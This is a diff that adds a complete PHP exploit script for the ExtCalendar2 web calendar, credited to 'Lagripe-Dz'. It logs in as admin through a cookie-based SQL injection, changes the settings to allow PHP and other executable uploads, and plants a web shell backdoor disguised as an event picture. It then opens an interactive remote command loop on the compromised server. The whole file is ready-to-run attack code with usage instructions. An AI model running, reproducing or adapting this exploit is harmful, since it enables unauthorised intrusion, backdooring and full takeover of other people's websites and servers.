@@ -1,0 +1,149 @@
+<?
+if(!$argv[1])
+die("
+
+Usage   : php exploit.php [site]
+Example : php exploit.php http://site.tld/calendar/
+
+");
+print_r("
+
+# Exploit....: [ ExtCalendar2 (Auth Bypass/Cookie) SQL Injection ]
+# Author.....: [ Lagripe-Dz ]
+# Date.......: [ 05-o6-2o11 ]
+# Twitter ...: [ @Lagripe_Dz ]
+# HoMe ......: [ Sec4Ever.com & Lagripe-Dz.org ]
+# Download ..: [ http://sourceforge.net/projects/extcal/ ]
+# Video .....: [ http://www.youtube.com/watch?v=2aatog92oqU ]
+
+                      -==[ ExPloiT ]==-
+					  
+javascript:document.cookie=\"ext20_username=admin ' or '1'= '1\";
+javascript:document.cookie=\"ext20_password=admin ' or '1'= '1\";
+
+                       -==[ Start ]==-
+
+");
+
+$target = $argv[1];
+
+if(!extension_loaded("curl")){ die("error::cURL extension required"); }
+
+# first get cookie prefix from page source ( xxx_username by default > ext20_username )
+preg_match_all('#extcal_cookie_id = "(.*)"#', DzCURL($target,0,0) , $prf);
+$prefix = $prf[1][0];
+
+# header ..
+$header[] = "Cookie: ".$prefix."_username=admin ' or '1'= '1; ".$prefix."_password=admin ' or '1'= '1;";
+
+# check if it's work by looking for [ logout ]
+echo (eregi("logout", DzCURL($target,0,$header))) ? "# Login :D\n":die("# Failed : Can't Login");
+
+# data of new settings with allowed php extension
+
+$new_settings = Array(
+    "calendar_name" => "Calendar name","calendar_description" => "Calendar description",
+    "calendar_admin_email" => "Calendar Administrator email","cookie_name" => "ext20",
+    "cookie_path" => "/","debug_mode" => 1,"calendar_status" => 1,"lang" => "english",
+    "charset" => "language-file","theme" => "default","timezone" => 1,"time_format_24hours" => 1,
+    "auto_daylight_saving" => 1,"main_table_width" => "50%","day_start" => 1,"default_view" => 1,
+    "search_view" => 1,"archive" => 1,"events_per_page" => 5,"sort_order" => "ta",
+    "show_recurrent_events" => 1,"multi_day_events" => "all","legend_cat_columns" => 5,
+    "allow_user_registration" => 1,"reg_duplicate_emails" => 1,"reg_email_verify" => 1,
+    "popup_event_mode" => 1,"popup_event_width" => 1,"popup_event_height" => 1,
+    "add_event_view" => 1,"addevent_allow_html" => 1,"addevent_allow_contact" => 1,
+    "addevent_allow_email" => 1,"addevent_allow_url" => 1,"addevent_allow_picture" => 1,
+    "new_post_notification" => 1,"monthly_view" => 1,"cal_view_show_week" => 1,
+    "cal_view_max_chars" => 100,"flyer_view" => 1,"flyer_show_picture" => 1,
+    "flyer_view_max_chars" => 100,"weekly_view" => 1,"weekly_view_max_chars" => 100,
+    "daily_view" => 1,"daily_view_max_chars" => 100,"cats_view" => 1,"cats_view_max_chars" => 100,
+    "mini_cal_def_picture" => 1,"mini_cal_diplay_options" => "default","mail_method" => "smtp",
+    "mail_smtp_host" => 0,"mail_smtp_auth" => 1,"mail_smtp_username" => 0,"mail_smtp_password" => 0,
+    "max_upl_dim" => 99999999999999999,"max_upl_size" => 99999999999999999,"picture_chmod" => 755,
+    "allowed_file_extensions" => "PHP/PY/PERL/HTACCESS/ASP/ASPX","update_config" => "Save New Configuration");
+	
+# post data and check if settings updated and php added
+echo (eregi("<strong>.*</strong>", DzCURL($target."admin_settings.php",$new_settings,$header))) ? "# Settings Updated :D\n":die("# Failed : can't update settings");
+
+# get event id for connect 2 backdoor
+$events = DzCURL($target."admin_events.php?eventfilter=0",0,$header);
+preg_match_all('#edit&id=(:?[0-9]+)#' ,$events ,$r );
+
+# backdoor xD
+
+$bd = "<?
+echo Exe(base64_decode(\$_GET[dz]));
+function Exe(\$command)
+{
+	if(function_exists('passthru')){\$exec = passthru(\$command);}
+	elseif(function_exists('system') && !\$exec){\$exec= system(\$command); }
+	elseif(function_exists('exec') && !\$exec){exec(\$command,\$output);\$exec=join(\"\n\",\$output);}
+	elseif(function_exists('shell_exec') && !\$exec){\$exec=shell_exec(\$command);}
+	elseif(function_exists('popen') && !\$exec){\$fp = popen(\$command,\"r\");
+	{while(!feof(\$fp)){\$result.=fread(\$fp,1024);}pclose(\$fp);}\$exec = convert_cyr_string(\$result,\"d\",\"w\");}
+	elseif(function_exists('win_shell_execute') && !\$exec){\$exec = winshell(\$command);}
+	elseif(function_exists('win32_create_service') && !\$exec){\$exec=srvshell(\$command);}
+	elseif(extension_loaded('ffi') && !\$exec){\$exec=ffishell(\$command);}
+	elseif(extension_loaded('perl') && !\$exec){\$exec=perlshell(\$command);}
+	elseif(!\$exec) {\$exec = slashBypass(\$command);}
+	elseif(!\$exec && extension_loaded('python'))
+	{\$exec = python_eval(\"import os
+	pwd = os.getcwd()
+	print pwd
+	os.system('\".\$command.\"')\");}
+	elseif(\$exec){return \$exec;}
+}
+?>";
+# make bd
+file_put_contents("dz.php",$bd);
+
+# new event with php backdoor
+$post_bd = array(
+   "mode"=>"edit","id"=>$r[1][0],"title"=>"blabla",
+    "description"=>"bla bla bla ,,,","cat"=> 1,
+    "day"=> 22,"month"=> 11,"year"=>2011,
+    "picture"=>"@".realpath("dz.php"),
+    "submit"=>"  Update Event  ");
+
+# post backdoor & check
+echo (!eregi("<strong>Errors</strong>", DzCURL($target."admin_events.php",$post_bd,$header))) ? "# Backdoor uploaded :D\n":die("# Failed : can't upload Backdoor");
+
+@unlink("dz.php"); # del backdoor after uploading
+
+# looking for backdoor
+preg_match_all('#upload/(:?[a-z0-9]+)_dz.php#' ,DzCURL($target."admin_events.php?mode=view&id=".$r[1][0],0,$header) ,$r2 );
+
+echo (!$r2[0][0]) ? die("# Failed : Backdoor not found !"):"";
+
+# connecting with backdoor :P
+while(1) {
+        fwrite(STDOUT, "\ncmd~# ");
+		// (trim((fgets(STDIN))) == "exit") ? exit:""; // exit from loop
+        $cmd = base64_encode(trim((fgets(STDIN))));
+	echo DzCURL($target.$r2[0][0]."?dz=".$cmd ,0,0);
+    }
+
+# function ...   
+ 
+function DzCURL($url,$posts ,$header){
+
+$curl=curl_init();
+curl_setopt($curl,CURLOPT_RETURNTRANSFER,1);
+if(is_array($header)){
+curl_setopt($curl, CURLOPT_HTTPHEADER, $header); 
+}
+curl_setopt($curl,CURLOPT_URL,$url);
+curl_setopt($curl,CURLOPT_USERAGENT,'Mozilla/5.0 (Windows NT 5.1; rv:2.0.1) Gecko/20100101 Firefox/4.0.1 DzCURL =)');
+curl_setopt($curl,CURLOPT_FOLLOWLOCATION,1);
+if(is_array($posts)){
+curl_setopt($curl,CURLOPT_POST,1);
+curl_setopt($curl,CURLOPT_POSTFIELDS,$posts);
+}
+curl_setopt($curl,CURLOPT_TIMEOUT,5);
+
+$exec=curl_exec($curl);
+curl_close($curl);
+return $exec;
+}
+# _EOF
+?>
